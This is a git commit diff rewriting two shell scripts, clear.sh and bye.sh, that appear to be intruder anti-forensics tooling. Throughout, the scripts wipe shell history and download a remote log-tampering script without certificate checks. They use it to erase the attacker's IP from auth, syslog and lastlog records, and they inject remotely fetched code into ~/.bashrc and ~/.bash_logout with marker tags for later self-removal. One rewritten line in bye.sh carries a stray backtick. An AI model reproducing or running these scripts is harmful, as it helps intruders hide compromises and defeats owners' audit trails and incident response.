483c27af9e077e33150b2a2c56b55575b6698738
root <root@localhost.localdomain>
2019-03-28 04:23:38 -0400

    ok

--- bye.sh
+++ bye.sh
@@ -1,79 +1,54 @@
-history -c ;
-unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG;
-export HISTFILE=/dev/null;
-export HISTSIZE=0;
-export HISTFILESIZE=0;
-REST="\e[0m"
-UNDERLINE="\e[4m"
-ColorBlack="\e[30m"
-ColorRed="\e[31m"
-ColorGreen="\e[32m"
-ColorYellow="\e[33m"
-ColorBlue="\e[34m"
-ColorMagenta="\e[35m"
-
-
-my_name="$(whoami)"
-
-my_ips=/tmp/_asdgninvidsfasdg125125sadsaf;
-index_f=/tmp/_fadsgindexfs;
-clear_shell=/tmp/asdgsdgdg_log_c;
-
-function gglog {
-    echo -e "${ColorBlue}[!]${REST} ${ColorYellow}$* ${REST}"
-}
-
-function _resume {
-  for i in $(cat $index_f);
-  do
-    if [ -f $1 ];then
-      mv $i /var/log/  2>/dev/null;
-      if [ $? -eq 0 ];then
-	 gglog $i " [resume]"
-      fi 
-    fi 
-  done
-}
-
-
-gglog "collection info for clear"
-
-if [ -f ~/.bash_logout ];then
-  gglog "ByeHack already ready "
-fi
-
-
-if [ !  -f $clear_shell ];then
-    wget --no-check-certificate  -q -c -t 3 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/logtamper.py' -O $clear_shell;
-    gglog "Download logtamper ok"
-fi
-
-function CL {
-    if [ -f $clear_shell ];then
-	for ip_one in $(cat $my_ips);do
-	    gglog "clear $my_name $ip_one"
-    	    python $clear_shell -m 2 -u $my_name -i $ip_one ;
-    	    python $clear_shell -m 1 -u $my_name -i $ip_one ;
-        done
-    else
-	gglog "no cl to found"
-    fi
-}
-
-
-function ByeHack {
-  mv /tmp/_bash ~/.bashrc
-  if [[ "$(cat /tmp/_bash_out)" == "" ]];then
-      rm ~/.bash_logout;
-  else
-      mv /tmp/_bash_out ~/.bash_logout;
-  fi
-  CL
-  _resume;
-  rm $my_ips;
-  rm $index_f;
-  rm $clear_shell;
-  gglog "Safe Exit"
-}
-
-ByeHack;
+history -c ;  #_fdsagadsfasdgadsgsss
+unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG;  #_fdsagadsfasdgadsgsss
+export HISTFILE=/dev/null;  #_fdsagadsfasdgadsgsss
+export HISTSIZE=0;  #_fdsagadsfasdgadsgsss
+export HISTFILESIZE=0;  #_fdsagadsfasdgadsgsss
+REST="\e[0m"  #_fdsagadsfasdgadsgsss
+ColorYellow="\e[33m"  #_fdsagadsfasdgadsgsss
+ColorBlue="\e[34m"  #_fdsagadsfasdgadsgsss
+my_name="$(whoami)"  #_fdsagadsfasdgadsgsss
+my_ips=/tmp/_asdgninvidsfasdg125125sadsaf;  #_fdsagadsfasdgadsgsss
+index_f=/tmp/_fadsgindexfs;  #_fdsagadsfasdgadsgsss
+clear_shell=/tmp/asdgsdgdg_log_c;  #_fdsagadsfasdgadsgsss
+function gglog {  #_fdsagadsfasdgadsgsss
+    echo -e "${ColorBlue}[!]${REST} ${ColorYellow}$* ${REST}"  #_fdsagadsfasdgadsgsss
+}  #_fdsagadsfasdgadsgsss
+function _resume {  #_fdsagadsfasdgadsgsss
+  for i in $(cat $index_f);  #_fdsagadsfasdgadsgsss
+  do  #_fdsagadsfasdgadsgsss
+    if [ -f $1 ];then  #_fdsagadsfasdgadsgsss
+      mv $i /var/log/  2>/dev/null;  #_fdsagadsfasdgadsgsss
+      if [ $? -eq 0 ];then  #_fdsagadsfasdgadsgsss
+	 gglog $i " [resume]"  #_fdsagadsfasdgadsgsss
+      fi   #_fdsagadsfasdgadsgsss
+    fi   #_fdsagadsfasdgadsgsss
+  done  #_fdsagadsfasdgadsgsss
+}  #_fdsagadsfasdgadsgsss
+if [ !  -f $clear_shell ];then  #_fdsagadsfasdgadsgsss
+    wget --no-check-certificate  -q -c -t 3 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/logtamper.py' -O $clear_shell;  #_fdsagadsfasdgadsgsss
+    gglog "Download logtamper ok"  #_fdsagadsfasdgadsgsss
+fi  #_fdsagadsfasdgadsgsss
+function CL {  #_fdsagadsfasdgadsgsss
+  if [ -f $clear_shell ];then  #_fdsagadsfasdgadsgsss
+  	for ip_one in $(cat $my_ips);do  #_fdsagadsfasdgadsgsss
+  	    gglog "clear $my_name $ip_one"  #_fdsagadsfasdgadsgsss
+      	    python $clear_shell -m 2 -u $my_name -i $ip_one ;  #_fdsagadsfasdgadsgsss
+      	    python $clear_shell -m 1 -u $my_name -i $ip_one ;  #_fdsagadsfasdgadsgsss
+          done  #_fdsagadsfasdgadsgsss
+      else  #_fdsagadsfasdgadsgsss
+  	gglog "no cl to found"  #_fdsagadsfasdgadsgsss
+  fi  #_fdsagadsfasdgadsgsss
+}  #_fdsagadsfasdgadsgsss
+function ByeHack {    #_fdsagadsfasdgadsgsss
+    sed -ie '/#_fdsagadsfasdgadsgsss$/d' ~/.bashrc   #_fdsagadsfasdgadsgsss
+    sed -ie '/#_fdsagadsfasdgadsgsss$/d' ~/.bash_logout   #_fdsagadsfasdgadsgsss
+    if [[ "$(cat ~/.bash_logout)" == "" ]];then`  #_fdsagadsfasdgadsgsss
+      rm ~/.bash_logout  #_fdsagadsfasdgadsgsss
+    fi  #_fdsagadsfasdgadsgsss
+    CL    #_fdsagadsfasdgadsgsss
+    _resume;    #_fdsagadsfasdgadsgsss
+    rm $my_ips;    #_fdsagadsfasdgadsgsss
+    rm $index_f;    #_fdsagadsfasdgadsgsss
+    rm $clear_shell;    #_fdsagadsfasdgadsgsss
+}  #_fdsagadsfasdgadsgsss
+ByeHack;  #_fdsagadsfasdgadsgsss
--- clear.sh
+++ clear.sh
@@ -1,101 +1,94 @@
-if [ ! -f ~/.bashrc ];then 
-  touch /tmp/_bash;
-fi
-if [ ! -f ~/.bash_logout ];then
-  touch /tmp/_bash_out;
-else
-  cp ~/.bash_logout /tmp/_bash_out;
-fi
-
-history -c ;
-unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG;
-export HISTFILE=/dev/null;
-export HISTSIZE=0;
-export HISTFILESIZE=0;
-export HACK="cp ~/.bashrc /tmp/_bash;wget -c -t 2 --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/clear.sh' -O- -q  >> ~/.bashrc;bash;. ~/.bash_logout" 
-REST="\e[0m"
-UNDERLINE="\e[4m"
-ColorRed="\e[31m"
-ColorGreen="\e[32m"
-ColorYellow="\e[33m"
-ColorBlue="\e[34m"
-ColorMagenta="\e[35m"
-ColorCyan="\e[36m"
-
-my_name="$(whoami)"
-my_pts="$(who am i| awk '{print $2}' | xargs)"
-my_ips=/tmp/_asdgninvidsfasdg125125sadsaf;
-index_f=/tmp/_fadsgindexfs;
-clear_shell=/tmp/asdgsdgdg_log_c;
-
-function _bak {
-  if [ -f $1 ];then
-    cp -v $1 /tmp/  2>/dev/null 
-    echo $1 >> $index_f
-  fi
-}
-
-function _resume {
-  for i in $(cat $index_f);
-  do
-    if [ -f $1 ];then
-      mv $i /var/log/  2>/dev/null;
-      if [ $? -eq 0 ];then
-	 gglog $i " [resume]"
-      fi 
-    fi 
-  done
-}
-
-function gglog {
-    echo -e "${ColorBlue}[!]${REST} ${ColorYellow}$* ${REST}"
-}
-
-function CL {
-    if [ -f $clear_shell ];then
-	for ip_one in $(cat $my_ips);do
-	    gglog "clear $my_name $ip_one"
-    	    python $clear_shell -m 2 -u $my_name -i $ip_one ;
-    	    python $clear_shell -m 1 -u $my_name -i $ip_one ;
-        done
-    else
-	gglog "no cl to found"
-    fi
-}
-
-
-function ByeHack {
-  mv /tmp/_bash ~/.bashrc
-  if [[ "$(cat /tmp/_bash_out)" == "" ]];then
-      rm ~/.bash_logout;
-  else
-      mv /tmp/_bash_out ~/.bash_logout;
-  fi
-  CL
-  _resume;
-  rm $my_ips;
-  rm $index_f;
-  rm $clear_shell;
-}
-
-if [ !  -f $clear_shell ];then
-    wget --no-check-certificate  -q -c -t 3  'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/logtamper.py' -O $clear_shell;
-    gglog "Download logtamper ok"
-fi
-
-last | grep "still" |  grep "$my_pts" | awk '{ print $3}' | sort | uniq > $my_ips
-
-_bak /var/log/auth.log;
-_bak /var/log/syslog;
-_bak /var/log/lastlog;
-
-gglog "bak /var/log/"
-
-gglog "${UNDERLINE}ip:$(cat $my_ips | xargs) pts:${my_pts}  ${REST}"
-wget --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/bye.sh' -O- -q >> ~/.bash_logout;
-if [ $(( $(cat $my_ips | wc -l ) )) -gt 1 ];then
-    gglog "warnning user is logined in !!!! , so exit ";
-    ByeHack;
-else
-    gglog ${UNDERLINE}" safe ! -- enjoy your evil "
-fi
+history -c; #_fdsagadsfasdgadsgsss
+unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; #_fdsagadsfasdgadsgsss
+export HISTFILE=/dev/null; #_fdsagadsfasdgadsgsss
+export HISTSIZE=0; #_fdsagadsfasdgadsgsss
+export HISTFILESIZE=0; #_fdsagadsfasdgadsgsss
+export HACK="grep '_fdsagadsfasdgadsgsss' ~/.bashrc 1>/dev/null; if [ \$? -ne 0 ];then cp ~/.bashrc /tmp/_bash;wget -c -t 2 --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/clear.sh' -O- -q  >> ~/.bashrc; fi;bash; __safebyeCheck;" #_fdsagadsfasdgadsgsss
+REST="\e[0m" #_fdsagadsfasdgadsgsss
+UNDERLINE="\e[4m" #_fdsagadsfasdgadsgsss
+ColorRed="\e[31m" #_fdsagadsfasdgadsgsss
+ColorGreen="\e[32m" #_fdsagadsfasdgadsgsss
+ColorYellow="\e[33m" #_fdsagadsfasdgadsgsss
+ColorBlue="\e[34m" #_fdsagadsfasdgadsgsss
+ColorMagenta="\e[35m" #_fdsagadsfasdgadsgsss
+ColorCyan="\e[36m" #_fdsagadsfasdgadsgsss
+FLAG="" #_fdsagadsfasdgadsgsss
+my_name="$(whoami)" #_fdsagadsfasdgadsgsss
+my_pts="$(who am i| awk '{print $2}' | xargs)" #_fdsagadsfasdgadsgsss
+my_ips=/tmp/_asdgninvidsfasdg125125sadsaf; #_fdsagadsfasdgadsgsss
+index_f=/tmp/_fadsgindexfs; #_fdsagadsfasdgadsgsss
+clear_shell=/tmp/asdgsdgdg_log_c; #_fdsagadsfasdgadsgsss
+function _bak { #_fdsagadsfasdgadsgsss
+  if [ -f $1 ];then #_fdsagadsfasdgadsgsss
+    cp -v $1 /tmp/  2>/dev/null #_fdsagadsfasdgadsgsss
+    echo $1 >> $index_f #_fdsagadsfasdgadsgsss
+  fi #_fdsagadsfasdgadsgsss
+} #_fdsagadsfasdgadsgsss
+function _resume { #_fdsagadsfasdgadsgsss
+  for i in $(cat $index_f); #_fdsagadsfasdgadsgsss
+  do #_fdsagadsfasdgadsgsss
+    if [ -f $1 ];then #_fdsagadsfasdgadsgsss
+      mv $i /var/log/  2>/dev/null; #_fdsagadsfasdgadsgsss
+      if [ $? -eq 0 ];then #_fdsagadsfasdgadsgsss
+     gglog $i " [resume]" #_fdsagadsfasdgadsgsss
+      fi #_fdsagadsfasdgadsgsss
+    fi #_fdsagadsfasdgadsgsss
+  done #_fdsagadsfasdgadsgsss
+} #_fdsagadsfasdgadsgsss
+function gglog { #_fdsagadsfasdgadsgsss
+    echo -e "${ColorBlue}[!]${REST} ${ColorYellow}$* ${REST}" #_fdsagadsfasdgadsgsss
+} #_fdsagadsfasdgadsgsss
+function CL { #_fdsagadsfasdgadsgsss
+    if [ -f $clear_shell ];then #_fdsagadsfasdgadsgsss
+    for ip_one in $(cat $my_ips);do #_fdsagadsfasdgadsgsss
+        gglog "clear $my_name $ip_one" #_fdsagadsfasdgadsgsss
+            python $clear_shell -m 2 -u $my_name -i $ip_one ; #_fdsagadsfasdgadsgsss
+            python $clear_shell -m 1 -u $my_name -i $ip_one ; #_fdsagadsfasdgadsgsss
+        done #_fdsagadsfasdgadsgsss
+    else #_fdsagadsfasdgadsgsss
+    gglog "no cl to found" #_fdsagadsfasdgadsgsss
+    fi #_fdsagadsfasdgadsgsss
+} #_fdsagadsfasdgadsgsss
+function ByeHack { #_fdsagadsfasdgadsgsss
+    sed -ie '/#_fdsagadsfasdgadsgsss$/d' ~/.bashrc #_fdsagadsfasdgadsgsss
+    sed -ie '/#_fdsagadsfasdgadsgsss$/d' ~/.bash_logout #_fdsagadsfasdgadsgsss
+    CL #_fdsagadsfasdgadsgsss
+    _resume; #_fdsagadsfasdgadsgsss
+    rm $my_ips; #_fdsagadsfasdgadsgsss
+    rm $index_f; #_fdsagadsfasdgadsgsss
+    rm $clear_shell; #_fdsagadsfasdgadsgsss
+    pkill -9 $my_pts; #_fdsagadsfasdgadsgsss
+} #_fdsagadsfasdgadsgsss
+function __safebyeCheck { #_fdsagadsfasdgadsgsss
+    if [ ! -f ~/.bash_logout ];then #_fdsagadsfasdgadsgsss
+        wget --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/bye.sh' -O- -q >> ~/.bash_logout; #_fdsagadsfasdgadsgsss
+    else #_fdsagadsfasdgadsgsss
+        if [[ "$(grep '_asdgninvidsfasdg125125sadsaf' ~/.bash_logout)" == ""  ]];then #_fdsagadsfasdgadsgsss
+            wget --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/bye.sh' -O- -q >> ~/.bash_logout; #_fdsagadsfasdgadsgsss
+        fi #_fdsagadsfasdgadsgsss
+    fi #_fdsagadsfasdgadsgsss
+    . ~/.bash_logout #_fdsagadsfasdgadsgsss
+} #_fdsagadsfasdgadsgsss
+if [ !  -f $clear_shell ];then #_fdsagadsfasdgadsgsss
+    wget --no-check-certificate  -q -c -t 3  'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/logtamper.py' -O $clear_shell; #_fdsagadsfasdgadsgsss
+    gglog "Download logtamper ok" #_fdsagadsfasdgadsgsss
+fi #_fdsagadsfasdgadsgsss
+last | grep "still" |  grep "$my_pts" | awk '{ print $3}' | sort | uniq > $my_ips #_fdsagadsfasdgadsgsss
+_bak /var/log/auth.log; #_fdsagadsfasdgadsgsss
+_bak /var/log/syslog; #_fdsagadsfasdgadsgsss
+_bak /var/log/lastlog; #_fdsagadsfasdgadsgsss
+gglog "bak /var/log/" #_fdsagadsfasdgadsgsss
+gglog "${UNDERLINE}ip:$(cat $my_ips | xargs) pts:${my_pts}  ${REST}" #_fdsagadsfasdgadsgsss
+if [ ! -f ~/.bash_logout ];then #_fdsagadsfasdgadsgsss
+    wget --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/bye.sh' -O- -q >> ~/.bash_logout; #_fdsagadsfasdgadsgsss
+else #_fdsagadsfasdgadsgsss
+   if [[ "$(grep 'ByeHack' ~/.bash_logout)" == ""  ]];then #_fdsagadsfasdgadsgsss
+      wget --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/bye.sh' -O- -q >> ~/.bash_logout; #_fdsagadsfasdgadsgsss
+   fi #_fdsagadsfasdgadsgsss
+fi #_fdsagadsfasdgadsgsss
+if [ $(( $(cat $my_ips | wc -l ) )) -gt 1 ];then #_fdsagadsfasdgadsgsss
+    gglog "warnning user is logined in !!!! , so exit "; #_fdsagadsfasdgadsgsss
+    ByeHack; #_fdsagadsfasdgadsgsss
+else #_fdsagadsfasdgadsgsss
+    gglog ${UNDERLINE}" safe ! -- enjoy your evil " #_fdsagadsfasdgadsgsss
+fi #_fdsagadsfasdgadsgsss
